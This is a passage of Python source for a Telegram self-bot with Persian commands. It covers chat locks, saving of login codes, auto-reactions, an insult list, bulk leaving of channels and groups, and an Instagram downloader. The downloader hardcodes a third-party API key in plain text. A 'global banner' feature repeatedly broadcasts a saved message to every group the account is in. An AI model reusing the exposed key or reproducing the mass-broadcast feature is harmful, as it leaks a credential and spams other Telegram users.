    await message.edit("✅ **قفل فوروارد غیرفعال شد**")

@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
async def lock_voice_on_command(client, message):
    lock_settings["ویس"] = True
    await message.edit("✅ **قفل ویس فعال شد**\n\nارسال ویس در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
async def lock_voice_off_command(client, message):
    lock_settings["ویس"] = False
    await message.edit("✅ **قفل ویس غیرفعال شد**")

@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
async def lock_text_on_command(client, message):
    lock_settings["پیام"] = True
    await message.edit("✅ **قفل پیام فعال شد**\n\nارسال پیام متنی در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
async def lock_text_off_command(client, message):
    lock_settings["پیام"] = False
    await message.edit("✅ **قفل پیام غیرفعال شد**")

@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
async def lock_file_on_command(client, message):
    lock_settings["فایل"] = True
    await message.edit("✅ **قفل فایل فعال شد**\n\nارسال فایل در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
async def lock_file_off_command(client, message):
    lock_settings["فایل"] = False
    await message.edit("✅ **قفل فایل غیرفعال شد**")

@app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
async def lock_status_command(client, message):
    status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"

    for lock_type, status in lock_settings.items():
        emoji = "🔴" if status else "🟢"
        persian_status = "قفل" if status else "آزاد"
        status_text += f"{emoji} **{lock_type}**: {persian_status}\n"

    status_text += f"\n📊 **تعداد قفل‌های فعال:** {sum(lock_settings.values())} از {len(lock_settings)}"

    await message.edit(status_text)

@app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
async def reset_lock_command(client, message):
    for key in lock_settings:
        lock_settings[key] = False

    await message.edit("✅ **همه قفل‌ها ریست شدند**\n\nهمه دسترسی‌ها آزاد شدند.")

@app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
async def lock_help_command(client, message):
    help_text = """
🛡️✨ **مرکز کنترل قفل‌های پیوی**

╭───────◆◇◆───────╮
      🔒 کنترل حرفه‌ای حریم خصوصی
╰───────◆◇◆───────╯

📘 **شرح کوتاه:**  
با این دستورات می‌تونی تمام پیام‌ها، مدیاها و تعاملات داخل پیوی رو مدیریت و محدود کنی.

━━━━━━━━━━━━━━━━━━

🌐 **بخش ۱ — قفل‌های کلی**
• `همه روشن` ➜ فعال‌سازی کامل قفل‌ها  
• `همه خاموش` ➜ آزادسازی کامل  

━━━━━━━━━━━━━━━━━━

🎨 **بخش ۲ — مدیا و استیکر**
• `مدیا روشن` ➜ بستن عکس، ویدیو و مدیا  
• `مدیا خاموش` ➜ آزادسازی مدیا  
• `استیکر روشن` ➜ قفل استیکر و گیف  
• `استیکر خاموش` ➜ آزادسازی استیکر  

━━━━━━━━━━━━━━━━━━

🔁 **بخش ۳ — فوروارد و متن**
• `فوروارد روشن` ➜ جلوگیری از فوروارد  
• `فوروارد خاموش` ➜ آزادسازی فوروارد  
• `پیام روشن` ➜ قفل پیام‌های متنی  
• `پیام خاموش` ➜ مجاز کردن متن‌ها  

━━━━━━━━━━━━━━━━━━

🎧 **بخش ۴ — صدا و فایل**
• `ویس روشن` ➜ قفل ویس  
• `ویس خاموش` ➜ آزادسازی ویس  
• `فایل روشن` ➜ قفل فایل‌ها  
• `فایل خاموش` ➜ آزادسازی فایل  

━━━━━━━━━━━━━━━━━━

📊 **بخش ۵ — مدیریت وضعیت**
• `وضعیت قفل` ➜ نمایش وضعیت فعلی  
• `ریست قفل` ➜ بازگردانی به حالت اولیه  

━━━━━━━━━━━━━━━━━━

💡 **نمونه استفاده:**  
`همه روشن`  
"""
    await message.edit(help_text)

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
async def enable_anti_login(client, message):
    global anti_login_enabled
    anti_login_enabled = True
    await message.edit("""✅ **انتی لاگین فعال شد**

🛡️ **قابلیت‌ها:**
• شناسایی پیام‌های کد ورود از 777000
• استخراج خودکار کدهای ورود  
• ذخیره کدها در پیام‌های ذخیره شده
• حذف پیام اصلی برای امنیت

📱 **کدها در Saved Messages ذخیره می‌شوند**""")

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
async def disable_anti_login(client, message):
    global anti_login_enabled
    anti_login_enabled = False
    await message.edit("✅ **انتی لاگین غیرفعال شد**")

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
async def check_anti_login(client, message):
    status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"

    status_text = f"""🛡️ **وضعیت انتی لاگین:** {status}

{"📱 **سیستم فعال است** - کدهای ورود ذخیره می‌شوند" if anti_login_enabled else "🔓 **سیستم غیرفعال است** - پیام‌ها دست‌نخورده باقی می‌مانند"}"""

    await message.edit(status_text)

@app.on_message(filters.me & filters.regex(r'^ریکت\s+(.+)$'))
async def set_reaction_command(client, message):
    if len(message.command) < 2:
        await message.edit("""✨ **سیستم ریکشن خودکار**

📌 **استفاده:**
• `ریکت 😊` (ریپلای روی پیام کاربر)
• `ریکت 😊 @username`

📌 **دستورات دیگر:**
• `حذف ریکت` (ریپلای یا یوزرنیم)
• `لیست ریکت`
• `پاکسازی ریکت`""")
        return

    reaction_emoji = message.command[1]

    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
        auto_reactions[str(user_id)] = reaction_emoji
        save_reactions()
        await message.edit(f"""✅ **ریکشن ثبت شد**
👤 **کاربر:** {user_name}
🆔 **آیدی:** `{user_id}`
🎭 **ریکشن:** {reaction_emoji}""")
        return

    if len(message.command) > 2:
        username = message.command[2].lstrip('@')
        try:
            user = await client.get_users(username)
            user_id = user.id
            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "کاربر"
            auto_reactions[str(user_id)] = reaction_emoji
            save_reactions()
            await message.edit(f"""✅ **ریکشن ثبت شد**
👤 **کاربر:** {user_name}
🆔 **آیدی:** `{user_id}`
🎭 **ریکشن:** {reaction_emoji}""")
        except:
            await message.edit("❌ **کاربر یافت نشد**\nلطفاً یوزرنیم معتبر وارد کنید")
        return

    await message.edit("❌ **روی پیام کاربر ریپلای کنید یا یوزرنیم وارد کنید**")

@app.on_message(filters.me & filters.regex(r'^لیست ریکت$'))
async def list_reactions_command(client, message):
    if not auto_reactions:
        await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
        return

    list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"
    for user_id, reaction in auto_reactions.items():
        try:
            user = await client.get_users(int(user_id))
            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or "بدون نام"
            list_text += f"👤 **{user_name}**\n🆔 `{user_id}` → {reaction}\n"
            list_text += "─" * 30 + "\n"
        except:
            list_text += f"👤 کاربر نامشخص\n🆔 `{user_id}` → {reaction}\n"
            list_text += "─" * 30 + "\n"

    list_text += f"\n📊 **تعداد:** {len(auto_reactions)} ریکشن"
    await message.edit(list_text)

@app.on_message(filters.me & filters.regex(r'^پاکسازی ریکت$'))
async def clear_reactions_command(client, message):
    if not auto_reactions:
        await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
        return

    reaction_count = len(auto_reactions)
    auto_reactions.clear()
    save_reactions()

    await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")

@app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
async def insult_list_command(client: Client, message: Message):
    insults_list = load_insults()
    if not insults_list:
        return await message.edit("❌ **لیست فحش‌ها خالی است**")
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")
        list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"
        for i, insult in enumerate(insults_list, 1):
            list_text += f"{i}. {insult}\n"
            if len(list_text) > 3500:
                await loading_msg.edit(list_text)
                list_text = f"💢 **ادامه لیست فحش‌ها**\n\n"
                loading_msg = await message.reply("🔄 **در حال ادامه لیست...**")

        if len(list_text) > 0:
            await loading_msg.edit(list_text)

    except Exception as e:
        await message.edit(f"❌ **خطا در دریافت لیست فحش‌ها:**\n`{e}`")

@app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
async def quick_edit_command(client: Client, message: Message):
    try:
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
            return
        command_parts = message.text.split()
        if len(command_parts) != 4:
            await message.edit("❌ **فرمت نادرست!**\n\n**فرمت صحیح:**\n`ویرایش کلمه_قدیمی به کلمه_جدید`\n\n**مثال:**\n`ویرایش سلان به سلام`")
            return
        old_word = command_parts[1]
        separator = command_parts[2]
        new_word = command_parts[3]
        if separator != "به":
            await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**\n\n**مثال:**\n`ویرایش سلان به سلام`")
            return
        replied_message = message.reply_to_message
        old_text = replied_message.text or replied_message.caption or ""
        if old_word not in old_text:
            await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
            return
        new_text = old_text.replace(old_word, new_word)
        await client.edit_message_text(
            chat_id=replied_message.chat.id,
            message_id=replied_message.id,
            text=new_text
        )
        await message.delete()
    except Exception as e:
        await message.edit(f"❌ **خطا در ویرایش:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
async def set_banner_command(client: Client, message: Message):
    global banner_counter

    try:
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
            return

        replied_message = message.reply_to_message
        banner_id = banner_counter
        banner_counter += 1
        banners[banner_id] = {
            'message': replied_message,
            'text': replied_message.text or replied_message.caption or "",
            'media': replied_message.media,
            'created_at': datetime.now()
        }

        await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")

    except Exception as e:
        await message.edit(f"❌ **خطا در ثبت بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
async def start_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])

        if banner_id not in banners:
            await message.edit("❌ **کد بنر یافت نشد**")
            return
        active_broadcasts['global'] = {
            'banner_id': banner_id,
            'running': True,
            'start_time': datetime.now()
        }

        await message.edit("✅ **بنر همگانی فعال شد**\n\n🔄 ارسال بنر به گروه‌ها و سوپرگروه‌ها شروع شد")
        asyncio.create_task(send_global_banner(client, banner_id))

    except Exception as e:
        await message.edit(f"❌ **خطا در فعال‌سازی بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
async def list_banners_command(client: Client, message: Message):
    try:
        if not banners:
            await message.edit("❌ **هیچ بنری ثبت نشده است**")
            return

        list_text = "📋 **لیست بنرها**\n\n"

        for banner_id, banner_data in banners.items():
            created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
            preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']

            list_text += f"🆔 **کد:** `{banner_id}`\n"
            list_text += f"📝 **پیش‌نمایش:** {preview}\n"
            list_text += f"⏰ **زمان ثبت:** {created_time}\n"
            list_text += "─" * 30 + "\n"

        await message.edit(list_text)

    except Exception as e:
        await message.edit(f"❌ **خطا در نمایش لیست:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
async def stop_broadcast_command(client: Client, message: Message):
    try:
        if 'global' in active_broadcasts:
            active_broadcasts['global']['running'] = False
            await message.edit("✅ **بنر همگانی خاموش شد**")
        else:
            await message.edit("❌ **بنر همگانی فعال نیست**")

    except Exception as e:
        await message.edit(f"❌ **خطا در خاموش کردن بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
async def instant_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])

        if banner_id not in banners:
            await message.edit("❌ **کد بنر یافت نشد**")
            return

        await message.edit("🔄 **شروع ارسال فوری بنر...**")
        asyncio.create_task(send_instant_broadcast(client, banner_id))

    except Exception as e:
        await message.edit(f"❌ **خطا در ارسال بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
async def set_banner_time_command(client: Client, message: Message):
    try:
        minutes = int(message.command[1])
        active_broadcasts['delay'] = minutes * 60

        await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")

    except Exception as e:
        await message.edit(f"❌ **خطا در تنظیم زمان:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("فرمت", prefixes=""))
async def format_command(client, message):
    html_tags = {
        "بولد": "<b>{}</b>",
        "ایتالیک": "<i>{}</i>",
        "زیر خط": "<u>{}</u>",
        "خط‌ خورده": "<s>{}</s>",
        "اسپویلر": "<spoiler>{}</spoiler>",
        "کد": "<code>{}</code>",
        "پیش‌ فرمت": "<pre>{}</pre>",
        "نقل‌ قول": "<blockquote>{}</blockquote>",
    }

    if len(message.command) < 2:
        status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"

        for format_name, is_active in format_settings.items():
            emoji = "🟢" if is_active else "🔴"
            status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"

        status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"

        await message.edit(f"""
{status_text}

📝 <b>دستورات فرمت:</b>
<code>فرمت بولد روشن</code>
<code>فرمت بولد خاموش</code>
<code>فرمت ایتالیک روشن</code>
<code>فرمت ایتالیک خاموش</code>
<code>فرمت زیر خط روشن</code>
<code>فرمت زیر خط خاموش</code>
<code>فرمت خط‌ خورده روشن</code>
<code>فرمت خط‌ خورده خاموش</code>
<code>فرمت اسپویلر روشن</code>
<code>فرمت اسپویلر خاموش</code>
<code>فرمت کد روشن</code>
<code>فرمت کد خاموش</code>
<code>فرمت پیش‌ فرمت روشن</code>
<code>فرمت پیش‌ فرمت خاموش</code>
<code>فرمت نقل‌ قول روشن</code>
<code>فرمت نقل‌ قول خاموش</code>

🔧 <b>سایر دستورات:</b>
<code>فرمت وضعیت</code> - نمایش وضعیت
<code>فرمت ریست</code> - غیرفعال کردن همه
""", parse_mode=enums.ParseMode.HTML)
        return
    if len(message.command) == 2:
        sub_command = message.command[1]
        if sub_command == "وضعیت":
            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"

            for format_name, is_active in format_settings.items():
                emoji = "🟢" if is_active else "🔴"
                status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"

            status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
            return
        elif sub_command == "ریست":
            for format_name in format_settings:
                format_settings[format_name] = False
            await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
            return
    if len(message.command) == 3:
        format_name = message.command[1]
        action = message.command[2]
        if format_name in format_settings:
            if action == "روشن":
                format_settings[format_name] = True
                sample_text = html_tags[format_name].format("این یک متن نمونه است")
                await message.edit(f"✅ <b>فرمت {format_name} فعال شد</b>\n\n📝 <b>نمونه:</b> {sample_text}", parse_mode=enums.ParseMode.HTML)
            elif action == "خاموش":
                format_settings[format_name] = False
                await message.edit(f"✅ <b>فرمت {format_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)
            else:
                await message.edit("❌ <b>دستور نامعتبر</b>\n\n💡 از <code>روشن</code> یا <code>خاموش</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
        else:
            await message.edit(f"❌ <b>فرمت نامعتبر</b>\n\n💡 فرمت‌های معتبر: {', '.join(format_settings.keys())}", parse_mode=enums.ParseMode.HTML)
    else:
        await message.edit("❌ <b>فرمت دستور نادرست</b>\n\n💡 از <code>فرمت</code> برای مشاهده راهنما استفاده کنید", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
async def channels_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")

        channels_count = 0
        channels_list = []

        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL:
                channels_count += 1
                channels_list.append(dialog.chat.title)

        result_text = f"""**📈 آمار کانال‌ها**

📊 **تعداد کل کانال‌ها:** `{channels_count}`

📋 **لیست کانال‌ها:**
"""
        for i, channel in enumerate(channels_list[:20], 1):
            result_text += f"{i}. {channel}\n"

        if len(channels_list) > 20:
            result_text += f"\n📝 و {len(channels_list) - 20} کانال دیگر..."

        await loading_msg.edit(result_text)

    except Exception as e:
        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
async def groups_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")

        groups_count = 0
        supergroups_count = 0
        groups_list = []

        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.GROUP:
                groups_count += 1
                groups_list.append(f"?? {dialog.chat.title}")
            elif dialog.chat.type == enums.ChatType.SUPERGROUP:
                supergroups_count += 1
                groups_list.append(f"👑 {dialog.chat.title}")

        total_groups = groups_count + supergroups_count

        result_text = f"""**📈 آمار گروه‌ها**

📊 **تعداد کل گروه‌ها:** `{total_groups}`
• گروه‌های معمولی: `{groups_count}`
• سوپرگروه‌ها: `{supergroups_count}`

📋 **لیست گروه‌ها:**
"""
        for i, group in enumerate(groups_list[:20], 1):
            result_text += f"{i}. {group}\n"

        if len(groups_list) > 20:
            result_text += f"\n📝 و {len(groups_list) - 20} گروه دیگر..."

        await loading_msg.edit(result_text)

    except Exception as e:
        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
async def leave_all_channels_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")

        channels = []

        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL:
                channels.append(dialog.chat)

        if not channels:
            return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")

        await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")

        success_count = 0
        failed_count = 0

        for i, channel in enumerate(channels, 1):
            try:
                await client.leave_chat(channel.id)
                success_count += 1
                await asyncio.sleep(4)

                if i % 5 == 0:
                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(channels)}")

            except Exception as e:
                failed_count += 1
                print(f"خطا در خروج از {channel.title}: {e}")

        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**

📊 **نتایج:**
• ✅ موفق: `{success_count}`
• ❌ ناموفق: `{failed_count}`
• 📊 کل کانال‌ها: `{len(channels)}`""")

    except Exception as e:
        await message.edit(f"**❌ خطا:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
async def leave_all_groups_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")

        groups = []

        async for dialog in client.get_dialogs():
            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                groups.append(dialog.chat)

        if not groups:
            return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")

        await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")

        success_count = 0
        failed_count = 0

        for i, group in enumerate(groups, 1):
            try:
                await client.leave_chat(group.id)
                success_count += 1
                await asyncio.sleep(4)

                if i % 3 == 0:
                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(groups)}")

            except Exception as e:
                failed_count += 1
                print(f"خطا در خروج از {group.title}: {e}")

        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**

📊 **نتایج:**
• ✅ موفق: `{success_count}`
• ❌ ناموفق: `{failed_count}`
• 📊 کل گروه‌ها: `{len(groups)}`""")

    except Exception as e:
        await message.edit(f"**❌ خطا:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("اکشن", prefixes=""))
async def action_command(client: Client, message: Message):
    if len(message.command) == 1:
        active_actions = [name for name, status in action_settings.items() if status]

        actions_text = """🎭 <b>سیستم اکشن خودکار</b>
📊 <b>وضعیت فعلی:</b>
"""
        if active_actions:
            actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
        else:
            actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"

        actions_text += """
🔧 <b>دستورات:</b>
<code>اکشن لیست</code> - نمایش لیست کامل اکشن‌ها
<code>اکشن [نام] روشن</code> - فعال کردن اکشن
<code>اکشن [نام] خاموش</code> - غیرفعال کردن اکشن
<code>اکشن وضعیت</code> - نمایش وضعیت دقیق
<code>اکشن ریست</code> - خاموش کردن همه اکشن‌ها

📝 <b>مثال:</b>
<code>اکشن تایپ روشن</code>
<code>اکشن اپلود فایل خاموش</code>
<code>اکشن وضعیت</code>
"""
        await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
        return

    sub_command = message.command[1]

    if sub_command == "لیست":
        actions_list = """🎭 <b>لیست کامل اکشن‌های تلگرام</b>

📝 <b>اکشن‌های متنی (نمایش به کاربر):</b>
• تایپ - ⌨️ در حال تایپ (Typing...)
• اپلود عکس - 📸 در حال آپلود عکس (Uploading photo...)
• ضبط ویس - 🎤 در حال ضبط ویس (Recording voice...)
• اپلود ویدیو - 🎥 در حال آپلود ویدیو (Uploading video...)
• اپلود فایل - 📄 در حال آپلود فایل (Uploading document...)
• ضبط ویدیو - 🎬 در حال ضبط ویدیو (Recording video...)
• اپلود ویس - 🎵 در حال آپلود ویس (Uploading voice...)
• اپلود ویدیو نوت - 📹 در حال آپلود ویدیو نوت (Uploading video note...)
• ضبط ویدیو نوت - 🎞️ در حال ضبط ویدیو نوت (Recording video note...)
• بازی - 🎮 در حال بازی (Playing...)
• انتخاب مخاطب - 👤 در حال انتخاب مخاطب (Choosing contact...)
• پیدا کردن موقعیت - 📍 در حال پیدا کردن موقعیت (Finding location...)
• انتخاب استیکر - 🎨 در حال انتخاب استیکر (Choosing sticker...)

💡 <b>نکته:</b>
وقتی کاربر پیام می‌فرستد، اکشن فعال نمایش داده می‌شود
اکشن‌ها در پیوی و گروه کار می‌کنند"""
        await message.edit(actions_list, parse_mode=enums.ParseMode.HTML)

    elif sub_command == "وضعیت":
        status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"

        for action_name, is_active in action_settings.items():
            emoji = "🟢" if is_active else "🔴"
            persian_name = get_persian_action_name(action_name)
            status_text += f"{emoji} <b>{persian_name}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"

        active_count = sum(action_settings.values())
        status_text += f"\n📈 <b>آمار:</b> {active_count} از {len(action_settings)} اکشن فعال"

        await message.edit(status_text, parse_mode=enums.ParseMode.HTML)

    elif sub_command == "ریست":
        for key in action_settings:
            action_settings[key] = False

        await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)
    else:
        full_text = ' '.join(message.command[1:])
        if " روشن" in full_text:
            action_name_persian = full_text.replace(" روشن", "").strip()
            action_state = "روشن"
        elif " خاموش" in full_text:
            action_name_persian = full_text.replace(" خاموش", "").strip()
            action_state = "خاموش"
        else:
            await message.edit("❌ <b>فرمت دستور نادرست است</b>\n\nمثال: <code>اکشن اپلود عکس روشن</code>", parse_mode=enums.ParseMode.HTML)
            return
        action_name = get_english_action_name(action_name_persian)
        if action_name not in action_settings:
            await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>\n\n📝 از دستور <code>اکشن لیست</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
            return

        if action_state == "روشن":
            action_settings[action_name] = True
            persian_name = get_persian_action_name(action_name)
            await message.edit(f"✅ <b>اکشن '{persian_name}' فعال شد</b>\n\nاز این به بعد وقتی کاربران پیام می‌فرستند، اکشن '{persian_name}' نمایش داده می‌شود.", parse_mode=enums.ParseMode.HTML)

        elif action_state == "خاموش":
            action_settings[action_name] = False
            persian_name = get_persian_action_name(action_name)
            await message.edit(f"✅ <b>اکشن '{persian_name}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("اینستا", prefixes=""))
async def instagram_download_command(client: Client, message: Message):
    try:
        if len(message.command) < 2:
            await message.edit("""
📥 **دستور دانلود اینستاگرام**

📝 **استفاده:**
`اینستا [لینک پست یا ریل]`

📌 **مثال‌ها:**

`اینستا https://www.instagram.com/reel/DOkym3fCFqg/`

`اینستا https://www.instagram.com/p/CzuF4KQqJ7q/`

""")
            return
        url = message.command[1].strip()
        if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")):
            await message.edit("❌ **لینک نامعتبر!**\nلطفا لینک معتبر اینستاگرام وارد کنید.")
            return
        if "/stories/" in url or "/story/" in url:
            await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
            return
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
        api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            import urllib.parse
            encoded_url = urllib.parse.quote(url, safe='')
            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"
            response = requests.get(final_api_url, headers=headers, timeout=45)
            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}")
            if response.status_code != 200:
                await loading_msg.edit(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status_code}")
                return
            try:
                data = response.json()
            except json.JSONDecodeError as e:
                await loading_msg.edit(f"❌ **پاسخ JSON نامعتبر**\n{str(e)}")
                return
            if not data.get("ok", False):
                error_msg = data.get("status", "خطای نامشخص")
                await loading_msg.edit(f"❌ **خطا از سمت API**\n{error_msg}")
                return
            if "result" not in data:
                await loading_msg.edit("❌ **پاسخ نامعتبر از سرور**\nفیلد 'result' یافت نشد")
                return

            result = data.get("result", {})

            if result.get("status") != "success":
                error_detail = result.get("message", "پست یافت نشد")
                await loading_msg.edit(f"❌ **خطا:** {error_detail}")
                return
            posts = result.get("result", [])

            if not posts:
                await loading_msg.edit("❌ **هیچ محتوایی در این پست یافت نشد**")
                return
            post = posts[0]
            post_id = post.get('id', 'نامشخص')
            username = post.get('username', 'نامشخص')
            caption = post.get('caption', 'بدون توضیح')
            is_video = post.get('is_video', False)
            thumbnail_url = post.get('video_img', '')
            caption_text = f"""
📸 **اینستاگرام دانلودر**

👤 **صاحب پست:** @{username}
🆔 **آیدی پست:** `{post_id}`

📝 **توضیحات:**
{caption[:500]}{'...' if len(caption) > 500 else ''}

#دانلود_اینستاگرام
"""
            thumbnail_path = None
            if thumbnail_url:
                try:
                    thumb_response = requests.get(thumbnail_url, timeout=15)
                    if thumb_response.status_code == 200:
                        thumbnail_path = f"temp_thumb_{post_id}.jpg"
                        with open(thumbnail_path, 'wb') as f:
                            f.write(thumb_response.content)
                except:
                    thumbnail_path = None
            if is_video:
                video_url = post.get('video_url')

                if not video_url:
                    await loading_msg.edit("❌ **لینک ویدیو یافت نشد**")
                    if thumbnail_path and os.path.exists(thumbnail_path):
                        os.remove(thumbnail_path)
                    return
                await loading_msg.edit("🎥 **در حال دانلود ویدیو...**")
                try:
                    video_response = requests.get(video_url, timeout=60)

                    if video_response.status_code != 200:
                        await loading_msg.edit("❌ **خطا در دانلود ویدیو**")
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        return
                    temp_file = f"temp_insta_{post_id}.mp4"
                    with open(temp_file, 'wb') as f:
                        f.write(video_response.content)
                    file_size = os.path.getsize(temp_file)
                    if file_size == 0:
                        await loading_msg.edit("❌ **فایل ویدیو خالی است**")
                        os.remove(temp_file)
                        if thumbnail_path and os.path.exists(thumbnail_path):
                            os.remove(thumbnail_path)
                        return
                    await loading_msg.edit("📤 **در حال آپلود ویدیو...**")
                    try:
                        await client.send_video(
                            chat_id=message.chat.id,
                            video=temp_file,
                            caption=caption_text,
                            thumb=thumbnail_path if thumbnail_path else None,
